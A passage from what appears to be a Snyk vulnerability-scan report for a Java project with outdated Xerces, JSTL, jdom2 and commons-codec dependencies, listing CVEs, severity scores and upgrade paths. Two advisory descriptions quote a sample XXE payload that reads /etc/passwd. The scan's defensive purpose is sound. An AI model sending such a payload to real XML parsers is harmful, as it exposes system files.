[NVD](https://nvd.nist.gov/vuln/detail/CVE-2012-0881)\n\n- [RedHat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=787104)\n",
      "epssDetails": {
        "percentile": "0.80882",
        "probability": "0.00939",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2012-0881"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-vmqm-g3vh-847m"
        ]
      },
      "packageName": "xerces:xercesImpl",
      "proprietary": false,
      "creationTime": "2017-11-12T08:41:04.509000Z",
      "functions_new": [
        {
          "version": [
            "[2.6.2,2.12.0)"
          ],
          "functionId": {
            "className": "org.apache.xerces.util.XMLAttributesImpl",
            "functionName": "addAttribute"
          }
        }
      ],
      "alternativeIds": [],
      "disclosureTime": "2012-02-02T22:00:00Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "xerces",
        "artifactId": "xercesimpl"
      },
      "publicationTime": "2017-11-16T08:41:04Z",
      "modificationTime": "2023-02-09T11:25:01.854327Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
        "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
        "net.sourceforge.nekohtml:nekohtml@1.9.22",
        "xerces:xercesImpl@2.11.0"
      ],
      "upgradePath": [
        false,
        "org.apache.jspwiki:jspwiki-main@2.11.3"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "xerces:xercesImpl",
      "version": "2.11.0"
    },
    {
      "id": "SNYK-JAVA-XERCES-5920442",
      "title": "Denial of Service (DoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "[,2.12.0)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.12.0"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 5.3,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "xerces:xercesimpl",
      "references": [
        {
          "url": "https://lists.apache.org/thread.html/49dc6702104a86ecbb40292dcd329ce9ae4c32b74733199ecab14a73@%3Cj-users.xerces.apache.org%3E",
          "title": "Apache Security Advisory"
        },
        {
          "url": "https://support.hpe.com/hpsc/doc/public/display?docLocale=en_US&docId=emr_na-hpesbst03857en_us",
          "title": "CONFIRM"
        },
        {
          "url": "https://www.debian.org/security/2018/dsa-4185",
          "title": "Debian Security Advisory"
        },
        {
          "url": "https://security.netapp.com/advisory/ntap-20180419-0001/",
          "title": "Netapp Security Advisory"
        },
        {
          "url": "http://www.oracle.com/technetwork/security-advisory/cpuapr2018-3678067.html",
          "title": "Oracle Security Advisory"
        },
        {
          "url": "https://access.redhat.com/errata/RHSA-2018:1188",
          "title": "RHSA Security Advisory"
        },
        {
          "url": "http://www.securityfocus.com/bid/103872",
          "title": "Security Focus"
        },
        {
          "url": "http://www.securitytracker.com/id/1040697",
          "title": "Security Tracker"
        },
        {
          "url": "https://usn.ubuntu.com/3644-1/",
          "title": "Ubuntu Security Advisory"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-05-04T00:54:18.528439Z"
        },
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-10-07T01:11:33.367236Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-09-01T18:48:45.581577Z"
        }
      ],
      "description": "## Overview\n[xerces:xercesImpl](http://xerces.apache.org) is a that is used for high performance, fully compliant XML parsers in the Apache Xerces family.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS). Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: JAXP). Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded, JRockit. Note: Applies to client and server deployment of Java. This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service.\n## Remediation\nUpgrade `xerces:xercesImpl` to version 2.12.0 or higher.\n## References\n- [Apache Security Advisory](https://lists.apache.org/thread.html/49dc6702104a86ecbb40292dcd329ce9ae4c32b74733199ecab14a73@%3Cj-users.xerces.apache.org%3E)\n- [CONFIRM](https://support.hpe.com/hpsc/doc/public/display?docLocale=en_US&docId=emr_na-hpesbst03857en_us)\n- [Debian Security Advisory](https://www.debian.org/security/2018/dsa-4185)\n- [Netapp Security Advisory](https://security.netapp.com/advisory/ntap-20180419-0001/)\n- [Oracle Security Advisory](http://www.oracle.com/technetwork/security-advisory/cpuapr2018-3678067.html)\n- [RHSA Security Advisory](https://access.redhat.com/errata/RHSA-2018:1188)\n- [Security Focus](http://www.securityfocus.com/bid/103872)\n- [Security Tracker](http://www.securitytracker.com/id/1040697)\n- [Ubuntu Security Advisory](https://usn.ubuntu.com/3644-1/)\n",
      "epssDetails": {
        "percentile": "0.55253",
        "probability": "0.00184",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2018-2799"
        ],
        "CWE": [
          "CWE-400"
        ]
      },
      "packageName": "xerces:xercesImpl",
      "proprietary": false,
      "creationTime": "2023-09-27T12:36:30.558422Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2018-04-19T02:29:00Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "xerces",
        "artifactId": "xercesimpl"
      },
      "publicationTime": "2019-01-31T10:17:47.304391Z",
      "modificationTime": "2023-09-27T12:44:53.634611Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
        "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
        "net.sourceforge.nekohtml:nekohtml@1.9.22",
        "xerces:xercesImpl@2.11.0"
      ],
      "upgradePath": [
        false,
        "org.apache.jspwiki:jspwiki-main@2.11.3"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "xerces:xercesImpl",
      "version": "2.11.0"
    },
    {
      "id": "SNYK-JAVA-XERCES-608891",
      "title": "Improper Input Validation",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N/RL:O",
      "credit": [
        "Chess Hazlett"
      ],
      "semver": {
        "vulnerable": [
          "[,2.12.0.SP03)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.12.0.SP03"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 5.3,
      "functions": [
        {
          "version": [
            "[,2.12.0.SP3)"
          ],
          "functionId": {
            "filePath": "org/apache/xerces/impl/xs/XMLSchemaValidator.java",
            "className": "XMLSchemaValidator",
            "functionName": "handleStartElement"
          }
        }
      ],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "xerces:xercesimpl",
      "references": [
        {
          "url": "https://github.com/jboss/xerces/commit/76348d1f67c20a658ff47ba009762372a7a47300",
          "title": "GitHub Commit"
        },
        {
          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1860054",
          "title": "RedHat Bugzilla Bug"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2023-03-26T14:48:45.766220Z"
        },
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 5.3,
          "modificationTime": "2022-01-03T18:05:02.659302Z"
        }
      ],
      "description": "## Overview\n[xerces:xercesImpl](http://xerces.apache.org) is a that is used for high performance, fully compliant XML parsers in the Apache Xerces family.\n\nAffected versions of this package are vulnerable to Improper Input Validation due to the way the XMLSchemaValidator class in the JAXP component of Wildfly enforced the \"use-grammar-pool-only\" feature. This flaw allows a specially-crafted XML file to manipulate the validation process in certain cases. This issue is the same flaw as CVE-2020-14621, which affected OpenJDK, and uses a similar code.\n## Remediation\nUpgrade `xerces:xercesImpl` to version 2.12.0.SP03 or higher.\n## References\n- [GitHub Commit](https://github.com/jboss/xerces/commit/76348d1f67c20a658ff47ba009762372a7a47300)\n- [RedHat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=1860054)\n",
      "epssDetails": {
        "percentile": "0.37283",
        "probability": "0.00090",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-14338"
        ],
        "CWE": [
          "CWE-20"
        ]
      },
      "packageName": "xerces:xercesImpl",
      "proprietary": false,
      "creationTime": "2020-08-28T15:36:13.189095Z",
      "functions_new": [
        {
          "version": [
            "[,2.12.0.SP3)"
          ],
          "functionId": {
            "className": "org.apache.xerces.impl.xs.XMLSchemaValidator",
            "functionName": "handleStartElement"
          }
        }
      ],
      "alternativeIds": [],
      "disclosureTime": "2020-08-27T00:00:00Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "xerces",
        "artifactId": "xercesimpl"
      },
      "publicationTime": "2020-09-14T03:24:10Z",
      "modificationTime": "2023-03-26T14:48:45.766220Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
        "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
        "net.sourceforge.nekohtml:nekohtml@1.9.22",
        "xerces:xercesImpl@2.11.0"
      ],
      "upgradePath": [
        false,
        "org.apache.jspwiki:jspwiki-main@2.11.3"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "xerces:xercesImpl",
      "version": "2.11.0"
    }
  ],
  "ok": false,
  "dependencyCount": 37,
  "org": "wtwhite",
  "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.25.1\nignore: {}\npatch: {}\n",
  "isPrivate": true,
  "licensesPolicy": {
    "severities": {},
    "orgLicenseRules": {
      "AGPL-1.0": {
        "licenseType": "AGPL-1.0",
        "severity": "high",
        "instructions": ""
      },
      "AGPL-3.0": {
        "licenseType": "AGPL-3.0",
        "severity": "high",
        "instructions": ""
      },
      "Artistic-1.0": {
        "licenseType": "Artistic-1.0",
        "severity": "medium",
        "instructions": ""
      },
      "Artistic-2.0": {
        "licenseType": "Artistic-2.0",
        "severity": "medium",
        "instructions": ""
      },
      "CDDL-1.0": {
        "licenseType": "CDDL-1.0",
        "severity": "medium",
        "instructions": ""
      },
      "CPOL-1.02": {
        "licenseType": "CPOL-1.02",
        "severity": "high",
        "instructions": ""
      },
      "EPL-1.0": {
        "licenseType": "EPL-1.0",
        "severity": "medium",
        "instructions": ""
      },
      "GPL-2.0": {
        "licenseType": "GPL-2.0",
        "severity": "high",
        "instructions": ""
      },
      "GPL-3.0": {
        "licenseType": "GPL-3.0",
        "severity": "high",
        "instructions": ""
      },
      "LGPL-2.0": {
        "licenseType": "LGPL-2.0",
        "severity": "medium",
        "instructions": ""
      },
      "LGPL-2.1": {
        "licenseType": "LGPL-2.1",
        "severity": "medium",
        "instructions": ""
      },
      "LGPL-3.0": {
        "licenseType": "LGPL-3.0",
        "severity": "medium",
        "instructions": ""
      },
      "MPL-1.1": {
        "licenseType": "MPL-1.1",
        "severity": "medium",
        "instructions": ""
      },
      "MPL-2.0": {
        "licenseType": "MPL-2.0",
        "severity": "medium",
        "instructions": ""
      },
      "MS-RL": {
        "licenseType": "MS-RL",
        "severity": "medium",
        "instructions": ""
      },
      "SimPL-2.0": {
        "licenseType": "SimPL-2.0",
        "severity": "high",
        "instructions": ""
      }
    }
  },
  "packageManager": "maven",
  "ignoreSettings": {
    "adminOnly": false,
    "reasonRequired": false,
    "disregardFilesystemIgnores": false
  },
  "summary": "35 vulnerable dependency paths",
  "remediation": {
    "unresolved": [
      {
        "id": "SNYK-JAVA-COMMONSCODEC-561518",
        "title": "Information Exposure",
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "credit": [
          "Hanson Char"
        ],
        "semver": {
          "vulnerable": [
            "[,1.13)"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [
          "1.13"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "java",
        "severity": "low",
        "cvssScore": 3.7,
        "functions": [
          {
            "version": [
              "[1.5,1.13)"
            ],
            "functionId": {
              "filePath": "org/apache/commons/codec/binary/Base32.java",
              "className": "Base32",
              "functionName": "decode"
            }
          },
          {
            "version": [
              "[,1.13)"
            ],
            "functionId": {
              "filePath": "org/apache/commons/codec/binary/Base64.java",
              "className": "Base64",
              "functionName": "decode"
            }
          }
        ],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "commons-codec:commons-codec",
        "references": [
          {
            "url": "https://github.com/apache/commons-codec/commit/48b615756d1d770091ea3322eefc08011ee8b113",
            "title": "GitHub Commit"
          },
          {
            "url": "https://issues.apache.org/jira/browse/CODEC-134",
            "title": "Jira Issue"
          }
        ],
        "cvssDetails": [],
        "description": "## Overview\n[commons-codec:commons-codec](https://commons.apache.org/proper/commons-codec) is a package that contains simple encoder and decoders for various formats such as Base64 and Hexadecimal.\n\nAffected versions of this package are vulnerable to Information Exposure. When there is no byte array value that can be encoded into a string the Base32 implementation does not reject it, and instead decodes it into an arbitrary value which can be re-encoded again using the same implementation. This allows for information exposure exploits such as tunneling additional information via seemingly valid base 32 strings.\n## Remediation\nUpgrade `commons-codec:commons-codec` to version 1.13 or higher.\n## References\n- [GitHub Commit](https://github.com/apache/commons-codec/commit/48b615756d1d770091ea3322eefc08011ee8b113)\n- [Jira Issue](https://issues.apache.org/jira/browse/CODEC-134)\n",
        "epssDetails": null,
        "identifiers": {
          "CVE": [],
          "CWE": [
            "CWE-200"
          ]
        },
        "packageName": "commons-codec:commons-codec",
        "proprietary": false,
        "creationTime": "2020-03-30T17:22:24.164713Z",
        "functions_new": [
          {
            "version": [
              "[1.5,1.13)"
            ],
            "functionId": {
              "className": "org.apache.commons.codec.binary.Base32",
              "functionName": "decode"
            }
          },
          {
            "version": [
              "[,1.13)"
            ],
            "functionId": {
              "className": "org.apache.commons.codec.binary.Base64",
              "functionName": "decode"
            }
          }
        ],
        "alternativeIds": [],
        "disclosureTime": "2020-03-30T17:20:23Z",
        "packageManager": "maven",
        "mavenModuleName": {
          "groupId": "commons-codec",
          "artifactId": "commons-codec"
        },
        "publicationTime": "2012-03-03T17:20:25Z",
        "modificationTime": "2020-06-12T14:37:04.472432Z",
        "socialTrendAlert": false,
        "packagePopularityRank": 99,
        "from": [
          "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
          "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
          "net.sourceforge:akismet-java@1.02",
          "commons-codec:commons-codec@1.3"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "commons-codec:commons-codec",
        "version": "1.3",
        "severityWithCritical": "low"
      },
      {
        "id": "SNYK-JAVA-JAVAXSERVLET-30449",
        "title": "XML External Entity (XXE) Injection",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
        "credit": [
          "David Jorm"
        ],
        "semver": {
          "vulnerable": [
            "[0,]"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "java",
        "severity": "high",
        "cvssScore": 7.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "javax.servlet:jstl",
        "references": [
          {
            "url": "http://mail-archives.us.apache.org/mod_mbox/www-announce/201502.mbox/%3C82207A16-6348-4DEE-877E-F7B87292576A@apache.org%3E",
            "title": "Apache Mail Archive"
          },
          {
            "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-0254",
            "title": "NVD"
          },
          {
            "url": "https://access.redhat.com/security/cve/CVE-2015-0254",
            "title": "RedHat CVE Database"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
            "cvssV3BaseScore": 7.3,
            "modificationTime": "2023-02-09T11:23:41.455575Z"
          },
          {
            "assigner": "Red Hat",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:L",
            "cvssV3BaseScore": 7.6,
            "modificationTime": "2022-09-01T18:14:00.387759Z"
          }
        ],
        "description": "## Overview\n[javax.servlet:jstl](https://mvnrepository.com/artifact/javax.servlet/jstl) is a collection of useful JSP tags which encapsulates the core functionality common to many JSP applications.\n\nAffected versions of this package are vulnerable to XML External Entity (XXE) Injection. Apache Standard Taglibs before 1.2.3 allows remote attackers to execute arbitrary code or conduct external XML entity (XXE) attacks via a crafted XSLT extension in a `<x:parse>` or `<x:transform>` JSTL XML tag.\n\n## Details\nXXE Injection is a type of attack against an application that parses XML input.\nXML is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. By default, many XML processors allow specification of an external entity, a URI that is dereferenced and evaluated during XML processing. When an XML document is being parsed, the parser can make a request and include the content at the specified URI inside of the XML document.\n\nAttacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier.\n\nFor example, below is a sample XML document, containing an XML element- username.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n   <username>John</username>\n</xml>\n```\n\nAn external XML entity - `xxe`, is defined using a system identifier and present within a DOCTYPE header. These entities can access local or remote content. For example the below code contains an external XML entity that would fetch the content of  `/etc/passwd` and display it to the user rendered by `username`.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n   <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n   <username>&xxe;</username>\n</xml>\n```\n\nOther XXE Injection attacks can access local resources that may not stop returning data, possibly impacting application availability and leading to Denial of Service.\n\n## Remediation\nThere is no fixed version for `javax.servlet:jstl`.\n## References\n- [Apache Mail Archive](http://mail-archives.us.apache.org/mod_mbox/www-announce/201502.mbox/%3C82207A16-6348-4DEE-877E-F7B87292576A@apache.org%3E)\n- [NVD](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-0254)\n- [RedHat CVE Database](https://access.redhat.com/security/cve/CVE-2015-0254)\n",
        "epssDetails": {
          "percentile": "0.92022",
          "probability": "0.05434",
          "modelVersion": "v2023.03.01"
        },
        "identifiers": {
          "CVE": [
            "CVE-2015-0254"
          ],
          "CWE": [
            "CWE-94"
          ],
          "GHSA": [
            "GHSA-6x4w-8w53-xrvv"
          ]
        },
        "packageName": "javax.servlet:jstl",
        "proprietary": false,
        "creationTime": "2017-02-22T07:28:19.341000Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2015-02-27T16:13:27Z",
        "packageManager": "maven",
        "mavenModuleName": {
          "groupId": "javax.servlet",
          "artifactId": "jstl"
        },
        "publicationTime": "2015-02-27T16:51:55Z",
        "modificationTime": "2023-02-09T11:23:41.455575Z",
        "socialTrendAlert": false,
        "packagePopularityRank": 99,
        "from": [
          "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
          "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
          "javax.servlet:jstl@1.2"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "javax.servlet:jstl",
        "version": "1.2",
        "severityWithCritical": "high"
      },
      {
        "id": "snyk:lic:maven:javax.servlet:jstl:CDDL-1.0",
        "type": "license",
        "title": "CDDL-1.0 license",
        "semver": {
          "vulnerable": [
            "[1.2,)"
          ]
        },
        "license": "CDDL-1.0",
        "language": "java",
        "description": "CDDL-1.0 license",
        "packageName": "javax.servlet:jstl",
        "creationTime": "2023-06-14T10:47:12.309Z",
        "packageManager": "maven",
        "publicationTime": "2023-06-14T10:47:12.309Z",
        "severity": "medium",
        "from": [
          "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
          "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
          "javax.servlet:jstl@1.2"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "javax.servlet:jstl",
        "version": "1.2",
        "severityWithCritical": "medium"
      },
      {
        "id": "SNYK-JAVA-ORGJDOM-1309669",
        "title": "XML External Entity (XXE) Injection",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "Esti Burstein of Aleph Research HCL Technologies"
        ],
        "semver": {
          "vulnerable": [
            "[0,2.0.6.1)"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "2.0.6.1"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "java",
        "severity": "high",
        "cvssScore": 7.5,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "org.jdom:jdom2",
        "references": [
          {
            "url": "https://github.com/hunterhacker/jdom/pull/188",
            "title": "GitHub PR"
          },
          {
            "url": "https://github.com/hunterhacker/jdom/releases/tag/JDOM-2.0.6.1",
            "title": "GitHub Release"
          },
          {
            "url": "https://alephsecurity.com/vulns/aleph-2021003",
            "title": "Security Advisory (with PoC)"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cvssV3BaseScore": 7.5,
            "modificationTime": "2022-07-26T01:11:26.422403Z"
          },
          {
            "assigner": "Red Hat",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cvssV3BaseScore": 7.5,
            "modificationTime": "2022-10-25T23:28:18.231601Z"
          },
          {
            "assigner": "SUSE",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cvssV3BaseScore": 7.5,
            "modificationTime": "2022-10-26T11:16:07.306247Z"
          }
        ],
        "description": "## Overview\n[org.jdom:jdom2](https://github.com/hunterhacker/jdom) is a Java manipulation of XML made easy.\n\nAffected versions of this package are vulnerable to XML External Entity (XXE) Injection via a crafted HTTP request.\n\n## Details\nXXE Injection is a type of attack against an application that parses XML input.\nXML is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. By default, many XML processors allow specification of an external entity, a URI that is dereferenced and evaluated during XML processing. When an XML document is being parsed, the parser can make a request and include the content at the specified URI inside of the XML document.\n\nAttacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier.\n\nFor example, below is a sample XML document, containing an XML element- username.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n   <username>John</username>\n</xml>\n```\n\nAn external XML entity - `xxe`, is defined using a system identifier and present within a DOCTYPE header. These entities can access local or remote content. For example the below code contains an external XML entity that would fetch the content of  `/etc/passwd` and display it to the user rendered by `username`.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n   <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n   <username>&xxe;</username>\n</xml>\n```\n\nOther XXE Injection attacks can access local resources that may not stop returning data, possibly impacting application availability and leading to Denial of Service.\n\n## Remediation\nUpgrade `org.jdom:jdom2` to version 2.0.6.1 or higher.\n## References\n- [GitHub PR](https://github.com/hunterhacker/jdom/pull/188)\n- [GitHub Release](https://github.com/hunterhacker/jdom/releases/tag/JDOM-2.0.6.1)\n- [Security Advisory (with PoC)](https://alephsecurity.com/vulns/aleph-2021003)\n",
        "epssDetails": {
          "percentile": "0.58420",
          "probability": "0.00216",
          "modelVersion": "v2023.03.01"
        },
        "identifiers": {
          "CVE": [
            "CVE-2021-33813"
          ],
          "CWE": [
            "CWE-611"
          ]
        },
        "packageName": "org.jdom:jdom2",
        "proprietary": false,
        "creationTime": "2021-06-16T13:22:35.092359Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2021-06-16T13:06:23Z",
        "packageManager": "maven",
        "mavenModuleName": {
          "groupId": "org.jdom",
          "artifactId": "jdom2"
        },
        "publicationTime": "2021-06-16T16:06:06Z",
        "modificationTime": "2022-10-26T11:16:07.306247Z",
        "socialTrendAlert": false,
        "packagePopularityRank": 99,
        "from": [
          "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
          "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
          "org.jdom:jdom2@2.0.5"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "org.jdom:jdom2",
        "version": "2.0.5",
        "severityWithCritical": "high"
      }
    ],
    "upgrade": {
      "org.apache.jspwiki:jspwiki-main@2.11.0.M2": {
        "upgradeTo": "org.apache.jspwiki:jspwiki-main@2.12.0",
        "upgrades": [
          "commons-fileupload:commons-fileupload@1.4",
          "commons-httpclient:commons-httpclient@3.1",
          "commons-httpclient:commons-httpclient@3.1",
          "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
          "net.sourceforge.nekohtml:nekohtml@1.9.22",
          "net.sourceforge.nekohtml:nekohtml@1.9.22",
          "net.sourceforge.nekohtml:nekohtml@1.9.22",
          "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
          "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
          "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
          "xerces:xercesImpl@2.11.0",
          "xerces:xercesImpl@2.11.0",
          "xerces:xercesImpl@2.11.0",
          "xerces:xercesImpl@2.11.0",
          "xerces:xercesImpl@2.11.0",
          "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
          "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
          "com.google.code.gson:gson@2.8.5",
          "commons-io:commons-io@2.4",
          "log4j:log4j@1.2.17",
          "log4j:log4j@1.2.17",
          "log4j:log4j@1.2.17",
          "log4j:log4j@1.2.17",
          "log4j:log4j@1.2.17",
          "log4j:log4j@1.2.17",
          "log4j:log4j@1.2.17",
          "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
          "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
          "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
          "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
          "org.apache.jspwiki:jspwiki-main@2.11.0.M2"
        ],
        "vulns": [
          "SNYK-JAVA-COMMONSFILEUPLOAD-3326457",
          "SNYK-JAVA-COMMONSHTTPCLIENT-30083",
          "SNYK-JAVA-COMMONSHTTPCLIENT-31660",
          "SNYK-JAVA-ORGAPACHEJSPWIKI-5603190",
          "SNYK-JAVA-NETSOURCEFORGENEKOHTML-2621454",
          "SNYK-JAVA-NETSOURCEFORGENEKOHTML-2774754",
          "SNYK-JAVA-NETSOURCEFORGENEKOHTML-2803036",
          "SNYK-JAVA-ORGAPACHEJSPWIKI-2971018",
          "SNYK-JAVA-ORGAPACHEJSPWIKI-2971019",
          "SNYK-JAVA-ORGAPACHEJSPWIKI-2971023",
          "SNYK-JAVA-XERCES-2359991",
          "SNYK-JAVA-XERCES-30183",
          "SNYK-JAVA-XERCES-31585",
          "SNYK-JAVA-XERCES-5920442",
          "SNYK-JAVA-XERCES-608891",
          "SNYK-JAVA-ORGAPACHEJSPWIKI-2413443",
          "SNYK-JAVA-ORGAPACHEJSPWIKI-2413444",
          "SNYK-JAVA-COMGOOGLECODEGSON-1730327",
          "SNYK-JAVA-COMMONSIO-1277109",
          "SNYK-JAVA-LOG4J-1300176",
          "SNYK-JAVA-LOG4J-2316893",
          "SNYK-JAVA-LOG4J-2342645",
          "SNYK-JAVA-LOG4J-2342646",
          "SNYK-JAVA-LOG4J-2342647",
          "SNYK-JAVA-LOG4J-3358774",
          "SNYK-JAVA-LOG4J-572732",
          "SNYK-JAVA-ORGAPACHEJSPWIKI-174750",
          "SNYK-JAVA-ORGAPACHEJSPWIKI-174755",
          "SNYK-JAVA-ORGAPACHEJSPWIKI-174829",
          "SNYK-JAVA-ORGAPACHEJSPWIKI-174839",
          "SNYK-JAVA-ORGAPACHEJSPWIKI-174840"
        ]
      }
    },
    "patch": {},
    "ignore": {},
    "pin": {}
  },
  "filesystemPolicy": false,
  "filtered": {
    "ignore": [],
    "patch": []
  },
  "uniqueCount": 35,
  "projectName": "io.github.jensdietrich.xshady:CVE-2019-0225",
  "displayTargetFile": "pom.xml",
  "hasUnknownVersions": false,
